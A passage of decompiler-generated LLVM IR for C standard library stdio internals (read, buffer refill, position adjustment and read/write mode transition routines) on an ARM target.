  br i1 %v2_111f8, label %dec_label_pc_11200, label %dec_label_pc_11270

dec_label_pc_11200:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_111e4
  %v0_11200 = load i32, i32* @r6, align 4
  %v7_11200 = icmp eq i32 %v0_11200, 1
  br i1 %v7_11200, label %dec_label_pc_11208, label %dec_label_pc_11200.dec_label_pc_1121c_crit_edge

dec_label_pc_11200.dec_label_pc_1121c_crit_edge:  ; preds = %dec_label_pc_11200
  br label %dec_label_pc_1121c

dec_label_pc_11208:                               ; preds = %dec_label_pc_11200
  %v0_11208 = load i32, i32* @r5, align 4
  store i32 %v0_11208, i32* %r0.global-to-local, align 4
  %v2_1120c = ptrtoint i32* %stack_var_-28 to i32
  %v2_11210 = inttoptr i32 %v0_11208 to i8*
  %v3_11210 = call i32 @__stdio_adjust_position(i8* %v2_11210, i32 %v2_1120c)
  store i32 %v3_11210, i32* %r0.global-to-local, align 4
  %v1_11214 = icmp slt i32 %v3_11210, 0
  br i1 %v1_11214, label %dec_label_pc_11270, label %dec_label_pc_11208.dec_label_pc_1121c_crit_edge

dec_label_pc_11208.dec_label_pc_1121c_crit_edge:  ; preds = %dec_label_pc_11208
  %v0_1121c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_11200.dec_label_pc_1121c_crit_edge, %dec_label_pc_11208.dec_label_pc_1121c_crit_edge
  %v0_1121c = phi i32 [ %v0_11200, %dec_label_pc_11200.dec_label_pc_1121c_crit_edge ], [ %v0_1121c.pre, %dec_label_pc_11208.dec_label_pc_1121c_crit_edge ]
  store i32 %v0_1121c, i32* %r2.global-to-local, align 4
  %v0_11220 = load i32, i32* @r5, align 4
  store i32 %v0_11220, i32* %r0.global-to-local, align 4
  %v4_11228 = call i32 @__stdio_seek(i32 %v0_11220, i32* nonnull %stack_var_-28, i32 %v0_1121c)
  store i32 %v4_11228, i32* %r0.global-to-local, align 4
  %v1_1122c = icmp slt i32 %v4_11228, 0
  br i1 %v1_1122c, label %dec_label_pc_11270, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_1121c
  %v0_11234 = load i32, i32* @r5, align 4
  %v1_11234 = inttoptr i32 %v0_11234 to i32*
  %v2_11234 = load i32, i32* %v1_11234, align 4
  store i32 %v2_11234, i32* %r3.global-to-local, align 4
  %v1_11238 = add i32 %v0_11234, 8
  %v2_11238 = inttoptr i32 %v1_11238 to i32*
  %v3_11238 = load i32, i32* %v2_11238, align 4
  store i32 %v3_11238, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11240 = and i32 %v2_11234, -72
  store i32 %v1_11240, i32* %r3.global-to-local, align 4
  %v3_11244 = sdiv i32 %v2_11234, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1124c = trunc i32 %v3_11244 to i8
  %v3_1124c = add i32 %v0_11234, 1
  %v4_1124c = inttoptr i32 %v3_1124c to i8*
  store i8 %v1_1124c, i8* %v4_1124c, align 1
  %v0_11250 = load i32, i32* %r2.global-to-local, align 4
  %v1_11250 = load i32, i32* @r5, align 4
  %v2_11250 = add i32 %v1_11250, 28
  %v3_11250 = inttoptr i32 %v2_11250 to i32*
  store i32 %v0_11250, i32* %v3_11250, align 4
  %v0_11254 = load i32, i32* %r0.global-to-local, align 4
  %v1_11254 = trunc i32 %v0_11254 to i8
  %v2_11254 = load i32, i32* @r5, align 4
  %v3_11254 = add i32 %v2_11254, 2
  %v4_11254 = inttoptr i32 %v3_11254 to i8*
  store i8 %v1_11254, i8* %v4_11254, align 1
  %v0_11258 = load i32, i32* %r3.global-to-local, align 4
  %v1_11258 = trunc i32 %v0_11258 to i8
  %v2_11258 = load i32, i32* @r5, align 4
  %v3_11258 = inttoptr i32 %v2_11258 to i8*
  store i8 %v1_11258, i8* %v3_11258, align 1
  %v0_1125c = load i32, i32* %r2.global-to-local, align 4
  %v1_1125c = load i32, i32* @r5, align 4
  %v2_1125c = add i32 %v1_1125c, 16
  %v3_1125c = inttoptr i32 %v2_1125c to i32*
  store i32 %v0_1125c, i32* %v3_1125c, align 4
  %v0_11260 = load i32, i32* %r2.global-to-local, align 4
  %v1_11260 = load i32, i32* @r5, align 4
  %v2_11260 = add i32 %v1_11260, 20
  %v3_11260 = inttoptr i32 %v2_11260 to i32*
  store i32 %v0_11260, i32* %v3_11260, align 4
  %v0_11264 = load i32, i32* %r2.global-to-local, align 4
  %v1_11264 = load i32, i32* @r5, align 4
  %v2_11264 = add i32 %v1_11264, 24
  %v3_11264 = inttoptr i32 %v2_11264 to i32*
  store i32 %v0_11264, i32* %v3_11264, align 4
  %v0_11268 = load i32, i32* %r0.global-to-local, align 4
  %v1_11268 = load i32, i32* @r5, align 4
  %v2_11268 = add i32 %v1_11268, 44
  %v3_11268 = inttoptr i32 %v2_11268 to i32*
  store i32 %v0_11268, i32* %v3_11268, align 4
  br label %dec_label_pc_11274

dec_label_pc_11270:                               ; preds = %dec_label_pc_111f0, %dec_label_pc_1121c, %dec_label_pc_11208
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_11234, %dec_label_pc_11270
  %v0_11274 = load i32, i32* %r7.global-to-local, align 4
  %v2_11274 = icmp eq i32 %v0_11274, 0
  br i1 %v2_11274, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11274
  store i32 %v2_11180, i32* %r0.global-to-local, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 70284, i32* @lr, align 4
  call void @__pseudo_branch(i32 58724)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11274, %dec_label_pc_11190, %bb
  %v0_1128c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1128c, i32* %r0.global-to-local, align 4
  store i32 %v3_11178, i32* @r4, align 4
  store i32 %v6_11178, i32* @r5, align 4
  store i32 %v9_11178, i32* @r6, align 4
  ret i32 %v0_1128c

; uselistorder directives
  uselistorder i32 %v0_1121c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 ()* @__pthread_return_0, { 11, 29, 28, 27, 26, 25, 24, 23, 4, 42, 45, 44, 5, 3, 2, 1, 41, 40, 39, 38, 16, 0, 15, 14, 13, 22, 21, 20, 19, 18, 17, 12, 8, 7, 6, 10, 9, 37, 32, 36, 43, 31, 30, 35, 34, 33 }
  uselistorder i32 ptrtoint (i8* @global_var_e55c.405 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 14, 40, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 0, 1, 44, 43, 48, 47, 46, 45, 3, 2, 16, 15, 8, 7, 6, 5, 4, 12, 11, 10, 9, 42, 34, 41, 33, 32, 31, 30, 39, 38, 37, 36, 35, 13 }
  uselistorder i32 58724, { 0, 5, 6, 7, 8, 1, 9, 10, 11, 2, 3, 4, 12 }
  uselistorder i32 22, { 1, 11, 2, 3, 4, 8, 5, 10, 12, 6, 13, 0, 9, 7 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11274, { 1, 0 }
  uselistorder label %dec_label_pc_11270, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1121c, { 1, 0 }
  uselistorder label %dec_label_pc_111e4, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_112a8 = load i32, i32* @r4, align 4
  store i32 %v3_112a8, i32* %stack_var_-12, align 4
  %v3_112ac = load i8, i8* %arg1, align 1
  %v4_112ac = zext i8 %v3_112ac to i32
  store i32 %v4_112ac, i32* %r3.global-to-local, align 4
  %v1_112b0 = and i32 %v4_112ac, 4
  store i32 %v1_112b0, i32* %r5.global-to-local, align 4
  %v2_112b0 = icmp eq i32 %v1_112b0, 0
  store i1 %v2_112b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_112b0, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_112a8, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_112c0 = icmp slt i32 %arg2, 0
  %v2_112c0 = icmp eq i32 %arg2, 0
  store i1 %v2_112c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_112c0, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_112c8 = add i32 %tmp, 4
  %v2_112c8 = inttoptr i32 %v1_112c8 to i32*
  %v3_112c8 = load i32, i32* %v2_112c8, align 4
  store i32 %v3_112c8, i32* %r0.global-to-local, align 4
  %v1_112cc = call i32 @__libc_read(i32 %v3_112c8)
  store i32 %v1_112cc, i32* %r0.global-to-local, align 4
  %v2_112d0 = icmp eq i32 %v1_112cc, 0
  store i1 %v2_112d0, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_112cc, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_112d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_112d4, i32* @r4, align 4
  ret i32 %v1_112cc

bb13:                                             ; preds = %bb10
  %v0_112d8 = load i32, i32* @r4, align 4
  %v1_112d8 = inttoptr i32 %v0_112d8 to i32*
  %v2_112d8 = load i32, i32* %v1_112d8, align 4
  %v1_112dc = or i32 %v2_112d8, 8
  store i32 %v1_112dc, i32* %r1.global-to-local, align 4
  %v1_112e0 = or i32 %v2_112d8, 4
  store i32 %v1_112e0, i32* %r3.global-to-local, align 4
  %v3_112e4 = sdiv i32 %v2_112d8, 256
  store i32 %v3_112e4, i32* %ip.global-to-local, align 4
  br i1 %v2_112d0, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_112ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_112ec, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_112f0 = trunc i32 %v3_112e4 to i8
  %v4_112f0 = add i32 %v0_112d8, 1
  %v5_112f0 = inttoptr i32 %v4_112f0 to i8*
  store i8 %v2_112f0, i8* %v5_112f0, align 1
  %v0_112f4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_112f4.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_112f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_112f4 = trunc i32 %v1_112f4 to i8
  %v3_112f4 = load i32, i32* @r4, align 4
  %v4_112f4 = inttoptr i32 %v3_112f4 to i8*
  store i8 %v2_112f4, i8* %v4_112f4, align 1
  %v0_112f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_112f8.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_112f8 = load i32, i32* %ip.global-to-local, align 4
  %v2_112f8 = trunc i32 %v1_112f8 to i8
  %v3_112f8 = load i32, i32* @r4, align 4
  %v4_112f8 = add i32 %v3_112f8, 1
  %v5_112f8 = inttoptr i32 %v4_112f8 to i8*
  store i8 %v2_112f8, i8* %v5_112f8, align 1
  %v0_112fc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_112fc.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_112fc = load i32, i32* %r1.global-to-local, align 4
  %v2_112fc = trunc i32 %v1_112fc to i8
  %v3_112fc = load i32, i32* @r4, align 4
  %v4_112fc = inttoptr i32 %v3_112fc to i8*
  store i8 %v2_112fc, i8* %v4_112fc, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_11300 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11300, i32* @r4, align 4
  %v11_11300 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_11300

; uselistorder directives
  uselistorder i32 %v3_112e4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11304 = load i32, i32* @r4, align 4
  store i32 %v3_11304, i32* %stack_var_-16, align 4
  %v2_11308 = add i32 %tmp, 1
  %v3_11308 = inttoptr i32 %v2_11308 to i8*
  %v4_11308 = load i8, i8* %v3_11308, align 1
  %v5_11308 = zext i8 %v4_11308 to i32
  %v3_1130c = load i8, i8* %arg1, align 1
  %v4_1130c = zext i8 %v3_1130c to i32
  store i32 %v4_1130c, i32* %r2.global-to-local, align 4
  %v4_11310 = mul nuw nsw i32 %v5_11308, 256
  %v5_11310 = or i32 %v4_1130c, %v4_11310
  store i32 %v5_11310, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1130c, 4
  %v2_11314 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11314, label %bb, label %dec_label_pc_11324

bb:                                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_11324:                               ; preds = %entry
  %v1_11314 = zext i8 %tmp15 to i32
  %v1_11324 = add nsw i32 %v1_11314, -1
  store i32 %v1_11324, i32* @ip, align 4
  %v7_11324 = icmp eq i8 %tmp15, 1
  br i1 %v7_11324, label %.thread, label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_11324
  %v1_1132c = and i32 %v4_11310, 2048
  %v2_1132c = icmp eq i32 %v1_1132c, 0
  br i1 %v2_1132c, label %.thread, label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_1132c
  %v8_11338 = icmp sgt i32 %v1_11324, 1
  br i1 %v8_11338, label %dec_label_pc_113c4, label %dec_label_pc_1133c

dec_label_pc_1133c:                               ; preds = %dec_label_pc_11334
  %v2_1133c = add i32 %tmp, 40
  %v3_1133c = inttoptr i32 %v2_1133c to i32*
  %v4_1133c = load i32, i32* %v3_1133c, align 4
  %v2_11340 = icmp eq i32 %v4_1133c, 0
  br i1 %v2_11340, label %dec_label_pc_11348, label %dec_label_pc_113c4

dec_label_pc_11348:                               ; preds = %dec_label_pc_1133c
  %v2_11348 = add i32 %tmp, 3
  %v3_11348 = inttoptr i32 %v2_11348 to i8*
  %v4_11348 = load i8, i8* %v3_11348, align 1
  %v5_11348 = zext i8 %v4_11348 to i32
  %v2_1134c = add i32 %tmp, 44
  %v3_1134c = inttoptr i32 %v2_1134c to i32*
  %v4_1134c = load i32, i32* %v3_1134c, align 4
  store i32 %v4_1134c, i32* %r2.global-to-local, align 4
  %v2_11350 = sub nsw i32 %v1_11324, %v5_11348
  %v1_11358 = add nsw i32 %v2_11350, -1
  store i32 %v1_11358, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_1134c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_11348
  %v7_1135c = add i32 %tmp, 2
  %v8_1135c = inttoptr i32 %v7_1135c to i8*
  %v9_1135c = load i8, i8* %v8_1135c, align 1
  %v10_1135c = zext i8 %v9_1135c to i32
  %v7_11360 = sub nsw i32 %v1_11358, %v10_1135c
  store i32 %v7_11360, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11348, %bb, %dec_label_pc_1132c, %dec_label_pc_11324, %bb12
  %v0_1137c = phi i32 [ %v1_11324, %dec_label_pc_1132c ], [ %v1_11324, %dec_label_pc_11324 ], [ 0, %bb ], [ %v7_11360, %bb12 ], [ %v1_11358, %dec_label_pc_11348 ]
  %v1_11364 = and i32 %v4_1130c, 64
  %v2_11364 = icmp eq i32 %v1_11364, 0
  %storemerge.in.in.v = select i1 %v2_11364, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11370 = add i32 %tmp, 16
  %v3_11370 = inttoptr i32 %v2_11370 to i32*
  %v4_11370 = load i32, i32* %v3_11370, align 4
  %v2_11374 = sub i32 %storemerge, %v4_11370
  %v1_11378 = inttoptr i32 %arg2 to i32*
  %v2_11378 = load i32, i32* %v1_11378, align 4
  store i32 %v2_11378, i32* %r1.global-to-local, align 4
  %v3_11378 = add i32 %arg2, 4
  %v4_11378 = inttoptr i32 %v3_11378 to i32*
  %v5_11378 = load i32, i32* %v4_11378, align 4
  store i32 %v5_11378, i32* %r2.global-to-local, align 4
  %v2_1137c = add i32 %v2_11374, %v0_1137c
  store i32 %v2_1137c, i32* %r5.global-to-local, align 4
  %v2_11380 = sub i32 %v2_11378, %v2_1137c
  %v2_11384 = and i32 %v2_1137c, 1073741824
  %v3_11384 = icmp ne i32 %v2_11384, 0
  %v6_11384 = icmp eq i1 %v3_11384, false
  %tmp16 = icmp slt i32 %v2_1137c, 0
  %v4_11384.neg = zext i1 %tmp16 to i32
  %v7_11384 = add i32 %v5_11378, %v4_11384.neg
  %v9_11384 = sext i1 %v6_11384 to i32
  %v10_11384 = add i32 %v7_11384, %v9_11384
  store i32 %v10_11384, i32* %r4.global-to-local, align 4
  store i32 %v2_11380, i32* %v1_11378, align 4
  %v5_11388 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11388, i32* %v4_11378, align 4
  %v0_1138c = load i32, i32* %r6.global-to-local, align 4
  %v1_1138c = add i32 %v0_1138c, 4
  %v2_1138c = inttoptr i32 %v1_1138c to i32*
  %v3_1138c = load i32, i32* %v2_1138c, align 4
  %v1_11390 = load i32, i32* %r2.global-to-local, align 4
  %v8_11394 = icmp sgt i32 %v3_1138c, %v1_11390
  br i1 %v8_11394, label %dec_label_pc_113a8, label %dec_label_pc_11398

dec_label_pc_11398:                               ; preds = %.thread
  %v9_11390 = icmp eq i32 %v3_1138c, %v1_11390
  br i1 %v9_11390, label %dec_label_pc_1139c, label %dec_label_pc_113acthread-pre-split

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11398
  %v1_1139c = inttoptr i32 %v0_1138c to i32*
  %v2_1139c = load i32, i32* %v1_1139c, align 4
  %v1_113a0 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1139c, %v1_113a0
  br i1 %tmp17, label %dec_label_pc_113a8, label %dec_label_pc_113acthread-pre-split

dec_label_pc_113a8:                               ; preds = %dec_label_pc_1139c, %.thread
  %v0_113a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_113a8 = sub i32 0, %v0_113a8
  store i32 %v1_113a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_113ac

dec_label_pc_113acthread-pre-split:               ; preds = %dec_label_pc_1139c, %dec_label_pc_11398
  %v0_113ac.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %dec_label_pc_113acthread-pre-split, %dec_label_pc_113a8
  %v0_113ac = phi i32 [ %v0_113ac.pr, %dec_label_pc_113acthread-pre-split ], [ %v1_113a8, %dec_label_pc_113a8 ]
  %v1_113ac = icmp slt i32 %v0_113ac, 0
  br i1 %v1_113ac, label %dec_label_pc_113b4, label %dec_label_pc_113c8

dec_label_pc_113b4:                               ; preds = %dec_label_pc_113ac
  %v0_113b4 = call i32 @__errno_location()
  %v2_113bc = inttoptr i32 %v0_113b4 to i32*
  store i32 75, i32* %v2_113bc, align 4
  %v0_113c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_113c8

dec_label_pc_113c4:                               ; preds = %dec_label_pc_1133c, %dec_label_pc_11334
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113ac, %dec_label_pc_113b4, %dec_label_pc_113c4
  %v0_113c8 = phi i32 [ %v0_113ac, %dec_label_pc_113ac ], [ %v0_113c8.pre, %dec_label_pc_113b4 ], [ -1, %dec_label_pc_113c4 ]
  %v2_113cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_113cc, i32* @r4, align 4
  ret i32 %v0_113c8

; uselistorder directives
  uselistorder i32 %v1_11390, { 1, 0 }
  uselistorder i32 %v3_1138c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1130c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_113c8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113d0 = load i32, i32* @r4, align 4
  store i32 %v3_113d0, i32* %stack_var_-8, align 4
  %v1_113d4 = add i32 %arg1, 8
  %v1_113d8 = inttoptr i32 %v1_113d4 to i32*
  %v2_113d8 = load i32, i32* %v1_113d8, align 4
  store i32 %v2_113d8, i32* @r1, align 4
  %v3_113d8 = add i32 %arg1, 12
  %v4_113d8 = inttoptr i32 %v3_113d8 to i32*
  %v5_113d8 = load i32, i32* %v4_113d8, align 4
  %v2_113dc = sub i32 %v5_113d8, %v2_113d8
  store i32 %v2_113dc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_113e4 = inttoptr i32 %arg1 to i8*
  %v4_113e4 = call i32 @__stdio_READ(i8* %v3_113e4, i32 %v2_113d8, i32 %v2_113dc)
  %v0_113e8 = load i32, i32* @r4, align 4
  %v1_113e8 = add i32 %v0_113e8, 8
  %v2_113e8 = inttoptr i32 %v1_113e8 to i32*
  %v3_113e8 = load i32, i32* %v2_113e8, align 4
  store i32 %v3_113e8, i32* %r2.global-to-local, align 4
  %v2_113ec = add i32 %v3_113e8, %v4_113e4
  %v2_113f0 = add i32 %v0_113e8, 20
  %v3_113f0 = inttoptr i32 %v2_113f0 to i32*
  store i32 %v2_113ec, i32* %v3_113f0, align 4
  %v0_113f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_113f4 = load i32, i32* @r4, align 4
  %v2_113f4 = add i32 %v1_113f4, 16
  %v3_113f4 = inttoptr i32 %v2_113f4 to i32*
  store i32 %v0_113f4, i32* %v3_113f4, align 4
  %v2_113f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_113f8, i32* @r4, align 4
  ret i32 %v4_113e4

; uselistorder directives
  uselistorder i32 %v4_113e4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_113fc = load i32, i32* @r4, align 4
  store i32 %v3_113fc, i32* %stack_var_-12, align 4
  %v0_11400 = load i32, i32* @r0, align 4
  %v1_11400 = inttoptr i32 %v0_11400 to i8*
  %v2_11400 = load i8, i8* %v1_11400, align 1
  %v3_11400 = zext i8 %v2_11400 to i32
  store i32 %v3_11400, i32* %r2.global-to-local, align 4
  %v1_11404 = add i32 %v0_11400, 1
  %v2_11404 = inttoptr i32 %v1_11404 to i8*
  %v3_11404 = load i8, i8* %v2_11404, align 1
  %v4_11404 = zext i8 %v3_11404 to i32
  store i32 %v4_11404, i32* %r3.global-to-local, align 4
  %v4_11408 = mul nuw nsw i32 %v4_11404, 256
  %v5_11408 = or i32 %v4_11408, %v3_11400
  store i32 %v5_11408, i32* %r2.global-to-local, align 4
  %v1_1140c = load i32, i32* @r1, align 4
  %v2_1140c = and i32 %v1_1140c, %v5_11408
  %v4_1140c = icmp eq i32 %v2_1140c, 0
  store i32 %v0_11400, i32* @r4, align 4
  br i1 %v4_1140c, label %dec_label_pc_11418, label %dec_label_pc_11430

dec_label_pc_11418:                               ; preds = %entry
  %v1_11418 = and i32 %v5_11408, 2176
  %v2_11418 = icmp eq i32 %v1_11418, 0
  br i1 %v2_11418, label %dec_label_pc_11420, label %dec_label_pc_11444

dec_label_pc_11420:                               ; preds = %dec_label_pc_11418
  %v2_11420 = or i32 %v1_1140c, %v5_11408
  store i32 %v2_11420, i32* %r2.global-to-local, align 4
  %v3_11424 = sdiv i32 %v2_11420, 256
  store i32 %v3_11424, i32* %r3.global-to-local, align 4
  %v1_11428 = trunc i32 %v3_11424 to i8
  store i8 %v1_11428, i8* %v2_11404, align 1
  %v0_1142c = load i32, i32* %r2.global-to-local, align 4
  %v1_1142c = trunc i32 %v0_1142c to i8
  %v2_1142c = load i32, i32* @r0, align 4
  %v3_1142c = inttoptr i32 %v2_1142c to i8*
  store i8 %v1_1142c, i8* %v3_1142c, align 1
  %v0_11430.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %entry, %dec_label_pc_11420
  %v0_11430 = phi i32 [ %v0_11400, %entry ], [ %v0_11430.pre, %dec_label_pc_11420 ]
  %v1_11430 = inttoptr i32 %v0_11430 to i8*
  %v2_11430 = load i8, i8* %v1_11430, align 1
  %v3_11430 = zext i8 %v2_11430 to i32
  store i32 %v3_11430, i32* %r2.global-to-local, align 4
  %v1_11434 = add i32 %v0_11430, 1
  %v2_11434 = inttoptr i32 %v1_11434 to i8*
  %v3_11434 = load i8, i8* %v2_11434, align 1
  %v4_11434 = zext i8 %v3_11434 to i32
  %v4_11438 = mul nuw nsw i32 %v4_11434, 256
  %v5_11438 = or i32 %v4_11438, %v3_11430
  store i32 %v5_11438, i32* %r3.global-to-local, align 4
  %v1_1143c = and i32 %v3_11430, 16
  store i32 %v1_1143c, i32* %r5.global-to-local, align 4
  %v2_1143c = icmp eq i32 %v1_1143c, 0
  br i1 %v2_1143c, label %dec_label_pc_1146c, label %dec_label_pc_11444

dec_label_pc_11444:                               ; preds = %dec_label_pc_11418, %dec_label_pc_11430
  %v0_11444 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1144c = inttoptr i32 %v0_11444 to i32*
  store i32 9, i32* %v2_1144c, align 4
  br label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_11474, %dec_label_pc_11444
  %v0_11450 = load i32, i32* @r4, align 4
  %v1_11450 = inttoptr i32 %v0_11450 to i32*
  %v2_11450 = load i32, i32* %v1_11450, align 4
  %v1_11454 = or i32 %v2_11450, 8
  store i32 %v1_11454, i32* %r3.global-to-local, align 4
  %v3_11458 = sdiv i32 %v2_11450, 256
  store i32 %v3_11458, i32* %r2.global-to-local, align 4
  %v1_11460 = trunc i32 %v3_11458 to i8
  %v3_11460 = add i32 %v0_11450, 1
  %v4_11460 = inttoptr i32 %v3_11460 to i8*
  store i8 %v1_11460, i8* %v4_11460, align 1
  %v0_11464 = load i32, i32* %r3.global-to-local, align 4
  %v1_11464 = trunc i32 %v0_11464 to i8
  %v2_11464 = load i32, i32* @r4, align 4
  %v3_11464 = inttoptr i32 %v2_11464 to i8*
  store i8 %v1_11464, i8* %v3_11464, align 1
  %v2_11468 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11468, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1146c:                               ; preds = %dec_label_pc_11430
  %v1_1146c = and i32 %v3_11430, 64
  %v2_1146c = icmp eq i32 %v1_1146c, 0
  br i1 %v2_1146c, label %dec_label_pc_1149c, label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %dec_label_pc_1146c
  %v0_11474 = call i32 @__stdio_wcommit()
  %v2_11478 = icmp eq i32 %v0_11474, 0
  br i1 %v2_11478, label %dec_label_pc_11480, label %dec_label_pc_11450

dec_label_pc_11480:                               ; preds = %dec_label_pc_11474
  %v0_11480 = load i32, i32* @r4, align 4
  %v1_11480 = inttoptr i32 %v0_11480 to i32*
